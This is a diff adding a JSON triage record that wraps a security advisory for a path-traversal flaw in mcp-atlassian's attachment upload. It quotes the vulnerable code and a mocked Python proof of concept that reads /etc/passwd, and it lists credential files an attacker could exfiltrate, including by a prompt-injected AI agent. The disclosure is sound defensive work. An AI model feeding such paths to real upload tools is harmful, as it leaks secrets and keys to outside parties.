@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/277980086?v=4\", \"events_url\": \"https://api.github.com/users/hewei-gikaku/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/hewei-gikaku/followers\", \"following_url\": \"https://api.github.com/users/hewei-gikaku/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/hewei-gikaku/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/hewei-gikaku\", \"id\": 277980086, \"login\": \"hewei-gikaku\", \"node_id\": \"U_kgDOEJGjtg\", \"organizations_url\": \"https://api.github.com/users/hewei-gikaku/orgs\", \"received_events_url\": \"https://api.github.com/users/hewei-gikaku/received_events\", \"repos_url\": \"https://api.github.com/users/hewei-gikaku/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/hewei-gikaku/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/hewei-gikaku/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/hewei-gikaku\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-77266\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\nThe `upload_attachment` functions in both the Jira and Confluence modules accept a user-controlled `file_path` parameter and open the specified file for reading **without calling `validate_safe_path()`**. An authenticated MCP client can supply an arbitrary path such as `/etc/passwd` or `/proc/self/environ`, causing the server process to read and transmit the file's contents to the remote Atlassian instance as an attachment.\\n\\nThis is an **incomplete fix** relative to GHSA-xjgw-4wvw-rgm4: the `download_attachment` and `download_issue_attachments` paths were hardened with `validate_safe_path()`, but the upload direction was left unguarded in both the Jira and Confluence modules.\\n\\n---\\n\\n### Details\\n\\n**Affected functions:**\\n\\n| File | Function | Line |\\n|------|----------|------|\\n| `src/mcp_atlassian/jira/attachments.py` | `upload_attachment()` | ~372–415 |\\n| `src/mcp_atlassian/confluence/attachments.py` | `upload_attachment()` | ~62–108 |\\n| `src/mcp_atlassian/confluence/attachments.py` | `_upload_attachment_direct()` | ~476–477 |\\n\\n**Jira — vulnerable code path (`jira/attachments.py`):**\\n\\n```python\\ndef upload_attachment(self, issue_key: str, file_path: str) -> dict:\\n    ...\\n    if not os.path.isabs(file_path):\\n        file_path = os.path.abspath(file_path)   # resolves relative paths\\n\\n    if not os.path.exists(file_path):             # confirms file exists\\n        ...\\n\\n    # ⚠ validate_safe_path() is NEVER called here\\n    filename = os.path.basename(file_path)\\n    with open(file_path, \\\"rb\\\") as file:           #  arbitrary file opened\\n        attachment = self.jira.add_attachment(\\n            issue_key=issue_key, filename=file_path\\n        )\\n```\\n\\nCompare with the **protected** download path in the same file:\\n\\n```python\\ndef download_attachment(self, url: str, target_path: str) -> bool:\\n    ...\\n    validate_safe_path(target_path)   #   upload has no equivalent\\n```\\n\\n**Confluence — vulnerable code path (`confluence/attachments.py`):**\\n\\n```python\\ndef upload_attachment(self, content_id, file_path, ...):\\n    ...\\n    if not os.path.isabs(file_path):\\n        file_path = os.path.abspath(file_path)\\n\\n    # ⚠ validate_safe_path() is NEVER called\\n    filename = os.path.basename(file_path)\\n    attachment = self._upload_attachment_direct(\\n        content_id, file_path, filename, comment, minor_edit\\n    )\\n\\n# Inside _upload_attachment_direct():\\nfiles = {\\\"file\\\": (filename, open(file_path, \\\"rb\\\"))}  # ← arbitrary file opened\\n```\\n\\n---\\n\\n### PoC\\n\\nTested against commit `d8bc786` (v0.21.1, latest `main`). No real Atlassian credentials required — the API call is stubbed.\\n\\n**Jira PoC (`poc_001_jira_path_traversal.py`):**\\n\\n```python\\nimport sys, os, types\\nfrom unittest.mock import MagicMock\\n\\nsys.path.insert(0, \\\"src\\\")\\n\\ndef _make_pkg(name):\\n    m = types.ModuleType(name); m.__path__ = []; sys.modules[name] = m; return m\\n\\natlassian_pkg  = _make_pkg(\\\"atlassian\\\")\\natlassian_jira = _make_pkg(\\\"atlassian.jira\\\")\\natlassian_pkg.jira = atlassian_jira\\natlassian_jira.Jira = type(\\\"Jira\\\", (), {\\n    \\\"__init__\\\": lambda s, *a, **k: None,\\n    \\\"_session\\\": MagicMock()\\n})\\natlassian_pkg.Jira = atlassian_jira.Jira\\nkeyring = _make_pkg(\\\"keyring\\\")\\nkeyring.get_password = keyring.set_password = lambda *a, **k: None\\n\\nfrom mcp_atlassian.jira.attachments import AttachmentsMixin\\nfrom mcp_atlassian.jira.config import JiraConfig\\n\\nconfig = JiraConfig(url=\\\"https://test.atlassian.net\\\", auth_type=\\\"basic\\\",\\n                    username=\\\"x\\\", api_token=\\\"x\\\")\\n\\nclass FakeFetcher(AttachmentsMixin):\\n    def __init__(self):\\n        self.config = config\\n        self.jira   = MagicMock()\\n        self.jira.add_attachment.return_value = {\\\"id\\\": \\\"99\\\", \\\"filename\\\": \\\"passwd\\\"}\\n\\nresult = FakeFetcher().upload_attachment(issue_key=\\\"TEST-1\\\", file_path=\\\"/etc/passwd\\\")\\nprint(result)\\n```\\n\\n**Observed output — Jira (Kali Linux, v0.21.1):**\\n\\n<img width=\\\"1342\\\" height=\\\"131\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/70f4a55e-428d-4790-80c1-631a24337dbc\\\" />\\n\\n```\\n[*] Target file : /etc/passwd\\n[*] Calling     : AttachmentsMixin.upload_attachment()\\n\\n[*] Return value: {'success': True, 'issue_key': 'TEST-1', 'filename': 'passwd', 'size': 3388, 'id': '99'}\\n[*] Files opened: ['/etc/passwd']\\n\\n[!!!] VULNERABLE — file opened with no path validation\\n      add_attachment call args: call(issue_key='TEST-1', filename='/etc/passwd')\\n```\\n\\n**Observed output — Confluence (Kali Linux, v0.21.1):**\\n\\n<img width=\\\"2682\\\" height=\\\"576\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/17fc641f-6c62-4e3f-87d0-81d6977f5004\\\" />\\n\\n```\\n[*] Target file : /etc/passwd\\n[*] Calling     : ConfluenceAttachmentsMixin.upload_attachment()\\n\\n[*] Return value: {'success': True, 'content_id': '123456', 'filename': 'passwd', 'size': 3388, 'id': 'att-99'}\\n[*] Files opened: ['/etc/passwd']\\n\\n[!!!] VULNERABLE — /etc/passwd opened without validate_safe_path()\\n      upload_attachment() → _upload_attachment_direct() → open(file_path)\\n      download_attachment() in same file IS protected — asymmetric fix\\n```\\n\\nKey evidence:\\n- `success: True` — no exception raised, no path validation triggered\\n- `size: 3388` — `/etc/passwd` was opened and read by `os.path.getsize()`\\n- Both modules affected independently — neither Jira nor Confluence has an upload-side guard\\n\\nIn a live deployment, the file content is streamed directly to the Atlassian API and stored as a visible attachment on the issue or page.\\n\\n---\\n\\n### Impact\\n\\nAny authenticated MCP client — including a compromised AI agent, a prompt-injected session, or a malicious plugin — can read and exfiltrate arbitrary files readable by the server process:\\n\\n- `/etc/shadow` — system password hashes\\n- `/proc/self/environ` — process environment variables (API keys, secrets)\\n- `~/.mcp-atlassian/oauth-*.json` — stored OAuth refresh tokens\\n- SSH private keys, TLS certificates, application configuration files\\n\\nNo special privileges beyond standard MCP tool access are required. The vulnerability affects both HTTP-mode (multi-user) and stdio-mode (local) deployments. Both the `jira_upload_attachment` and `confluence_upload_attachment` MCP tools are affected.\\n\\n**Root cause:** The `validate_safe_path()` utility introduced in GHSA-xjgw-4wvw-rgm4 was applied only to *download* operations. The upload path in both modules was never patched, leaving a symmetric file-read vector open.\", \"ghsa_id\": \"GHSA-mfv2-4wvm-9pgp\", \"github_reviewed_at\": \"2026-09-22T20:35:06Z\", \"html_url\": \"https://github.com/advisories/GHSA-mfv2-4wvm-9pgp\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-mfv2-4wvm-9pgp\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-77266\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-22T20:35:06Z\", \"references\": [\"https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-mfv2-4wvm-9pgp\", \"https://github.com/sooperset/mcp-atlassian/pull/1448\", \"https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460\", \"https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0\", \"https://github.com/advisories/GHSA-mfv2-4wvm-9pgp\"], \"repository_advisory_url\": \"https://api.github.com/repos/sooperset/mcp-atlassian/security-advisories/GHSA-mfv2-4wvm-9pgp\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/sooperset/mcp-atlassian\", \"summary\": \"MCP Atlassian: Path traversal in upload_attachment allows arbitrary file read and exfiltration via MCP tool call\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-22T20:35:06Z\", \"url\": \"https://api.github.com/advisories/GHSA-mfv2-4wvm-9pgp\", \"vulnerabilities\": [{\"first_patched_version\": \"0.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"mcp-atlassian\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.22.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-mfv2-4wvm-9pgp",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "mcp-atlassian: < 0.22.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-77266"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "mcp-atlassian"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-09-23T19:14:13.753082Z",
+  "provenance": {
+    "content_sha256": "28f313c313a297679eb2d11e896ba37fae346f9ec40dffeb57ee0bbe08d09949",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-22T20:35:06Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-mfv2-4wvm-9pgp",
+  "status": "active",
+  "title": "MCP Atlassian: Path traversal in upload_attachment allows arbitrary file read and exfiltration via MCP tool call",
+  "updated_at": "2026-09-22T20:35:06Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-mfv2-4wvm-9pgp"
+}
